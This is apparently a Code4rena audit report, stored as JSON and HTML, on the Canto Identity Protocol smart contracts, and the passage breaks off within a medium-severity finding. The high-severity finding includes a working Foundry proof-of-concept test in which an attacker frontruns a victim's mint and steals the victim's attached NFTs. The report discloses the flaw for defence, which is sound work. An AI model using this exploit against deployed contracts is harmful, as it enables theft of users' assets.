{
  "circa": {
    "title": "Canto Identity Protocol contest",
    "sponsor": "Canto Identity Protocol",
    "slug": "2023-01-canto-identity",
    "date": "2023-04-06",
    "findings": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues",
    "contest": 212
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Canto Identity Protocol smart contract system written in Solidity. The audit contest took place between January 31—February 3 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>39 Wardens contributed reports to the Canto Identity Protocol contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xackermann</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/DevABDee\">DevABDee</a></li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li><a href=\"https://twitter.com/HardlyDifficult\">HardlyDifficult</a></li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>Matin</li>\n<li>MiniGlome</li>\n<li>NoamYakov</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SleepingBugs (<a href=\"https://twitter.com/Deivitto\">Deivitto</a> and 0xLovesleep)</li>\n<li><a href=\"https://twitter.com/adrianromero\">adriro</a></li>\n<li>brevis</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>chaduke</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>d3e4</li>\n<li>descharre</li>\n<li>enckrish</li>\n<li>glcanvas</li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"twitter.com/henryxf3\">hihen</a></li>\n<li>horsefacts</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>libratus</li>\n<li>merlin</li>\n<li><a href=\"https://github.com/nicobevilacqua\">nicobevi</a></li>\n<li>popular00</li>\n<li>rotcivegaf</li>\n<li>shark</li>\n<li><a href=\"https://twitter.com/shenwilly_\">shenwilly</a></li>\n<li><a href=\"https://twitter.com/0xSorryNotSorry\">sorrynotsorry</a></li>\n<li>wait</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/berndartmueller\">berndartmueller</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 23 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 15 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-01-canto-identity\">C4 Canto Identity Protocol contest repository</a>, and is composed of 3 smart contracts written in the Solidity programming language and includes 320 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-1\" style=\"position:relative;\"><a href=\"#high-risk-findings-1\" aria-label=\"high risk findings 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (1)</h1>\n<h2 id=\"h-01-attacker-can-frontrun-a-victims-mintadd-transaction-to-steal-nft\" style=\"position:relative;\"><a href=\"#h-01-attacker-can-frontrun-a-victims-mintadd-transaction-to-steal-nft\" aria-label=\"h 01 attacker can frontrun a victims mintadd transaction to steal nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67\">[H-01] Attacker can frontrun a victim’s <code>mint</code>+<code>add</code> transaction to steal NFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67\">popular00</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/59\">gzeon</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L147\">CidNFT.sol#L147</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L165\">CidNFT.sol#L165</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L237\">CidNFT.sol#L237</a></p>\n<p>High - an attacker can steal deposited NFTs from victims using the <code>mint()</code> + <code>add()</code> functionality in <code>CidNFT.sol</code></p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>One of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their <code>CidNFT</code>. The <code>CidNFT</code> contract custodies these attached NFTs, and they are regarded as “traits” of the user.</p>\n<p>The protocol currently includes functionality for a user to mint a <code>CidNFT</code> as their identity and then optionally add a subprotocol NFT to that <code>CidNFT</code> in the same transaction. This occurs in the <code>mint()</code> function of <code>CidNFT.sol</code>, which takes a byte array of <code>add()</code> parameters and includes a loop where <code>add()</code> can be repeatedly called with these parameters to attach subprotocol NFTs to the <code>CidNFT</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function mint(bytes[] calldata _addList) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _mint(msg.sender, ++numMinted); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes4 addSelector = this.add.selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i = 0; i &lt; _addList.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool success /*bytes memory result*/, ) = address(this)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            .delegatecall(abi.encodePacked(addSelector, _addList[i]));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (!success) revert AddCallAfterMintingFailed(i);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>One of the arguments for <code>add()</code> is the <code>_cidNFTID</code> to which the user would like to attach their outside NFT. However, <code>_cidNFTID</code> is specified in calldata to <code>mint()</code>, and there is no guarantee that the user is actually <code>add()</code>ing to the <code>CidNFT</code> that they just minted. There is only a check in <code>add()</code> that the user is either the owner or approved for that <code>CidNFT</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function add(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string calldata _subprotocolName,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _key,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _nftIDToAdd,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        AssociationType _type</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...............</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cidNFTOwner != msg.sender &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        getApproved[_cidNFTID] != msg.sender &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        !isApprovedForAll[cidNFTOwner][msg.sender]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...............</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>This opens up the following attack:</p>\n<ol>\n<li>Victim sends a transaction expecting to mint <code>CidNFT #100</code>, and includes calldata to <code>add()</code> their SubprotocolNFT to the token in the same tx</li>\n<li>Attacker frontruns this transaction with a <code>mint()</code> with no <code>add()</code> parameters, receives <code>CidNFT #100</code>, and sets the victim as approved for that token</li>\n<li>The victim’s transaction begins execution, and they instead receive token #101, though their <code>add()</code> calldata still specifies token #100</li>\n<li>The victim’s <code>add()</code> call continues, and their SubprotocolNFT is registered to <code>CidNFT #100</code> and transferred to the <code>CidNFT</code> contract</li>\n<li>The attacker can then either revoke approval to the victim for <code>CidNFT #100</code> or immediately call <code>remove()</code> to transfer the victim’s SubprotocolNFT to themselves</li>\n</ol>\n<p>Below is a forge test executing this attack. This should run if dropped into <code>CidNFT.t.sol</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testMaliciousMint() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 cidTokenId = cidNFT.numMinted() + 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 key1, uint256 key2) = (1, 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // user1 == attacker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // user2 == victim</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Frontrun the victim&#39;s mint by minting the cidNFT token they expect before them</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidNFT.mint(new bytes[](0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Set the victim (user2) as approved for the token user1 just minted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidNFT.setApprovalForAll(user2, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // for the subtokens, and prepare the addlist with the incorrect cidNFT token id</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(user2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    sub1.mint(user2, subTokenId1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    sub1.mint(user2, subTokenId2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    sub1.setApprovalForAll(address(cidNFT), true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes[] memory addList = new bytes[](2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    addList[0] = abi.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cidTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;sub1&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        key1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        subTokenId1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        CidNFT.AssociationType.ORDERED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    addList[1] = abi.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cidTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;sub1&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        key2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        subTokenId2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        CidNFT.AssociationType.ORDERED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Mint user2 a new CidNFT and attach the subtokens to user1&#39;s CidNFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidNFT.mint(addList);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Confirm that user1&#39;s CidNFT has the subtokens and can transfer them out</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidNFT.remove(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cidTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;sub1&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        key1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        subTokenId1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        CidNFT.AssociationType.ORDERED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidNFT.remove(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cidTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;sub1&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        key2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        subTokenId2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        CidNFT.AssociationType.ORDERED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Confirm that user1 now holds the subtokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(cidNFT.ownerOf(cidTokenId), user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(sub1.ownerOf(subTokenId1), user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(sub1.ownerOf(subTokenId2), user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">## Tools Used</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Manual review</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">## Recommended Mitigation Steps</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67#issuecomment-1426123803\">OpenCoreCH (Canto Identity) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Great finding, will be fixed.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-4\" style=\"position:relative;\"><a href=\"#medium-risk-findings-4\" aria-label=\"medium risk findings 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (4)</h1>\n<h2 id=\"m-01-adding-nfts-with-associationtype-ordered-or-primary-may-cause-overwriting\" style=\"position:relative;\"><a href=\"#m-01-adding-nfts-with-associationtype-ordered-or-primary-may-cause-overwriting\" aria-label=\"m 01 adding nfts with associationtype ordered or primary may cause overwriting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187\">[M-01] Adding NFTS with AssociationType ORDERED or PRIMARY may cause overwriting</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187\">hihen</a></em></p>\n<p><strong><em>Note: Prior to this audit, a group of wardens added test coverage. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that timeframe were eligible to be judged. As such, this finding [M-01] was discovered during the “testing squad” phase and is being included here for completeness.</em></strong></p>\n<p>Subprotocol NFTs may be trapped in contract CidNFT forever.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When adding NFT to CidNFT with AssociationType ORDERED or PRIMARY, the cidData is written directly, without checking and handling the case that a previously added nft may not have been removed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_type == AssociationType.ORDERED) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} else if (_type == AssociationType.PRIMARY) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span></code></pre>\n<p>For <code>AssociationType.ORDERED</code>:<br>\nIf <code>(key1, subNft1)</code> and <code>(key1, 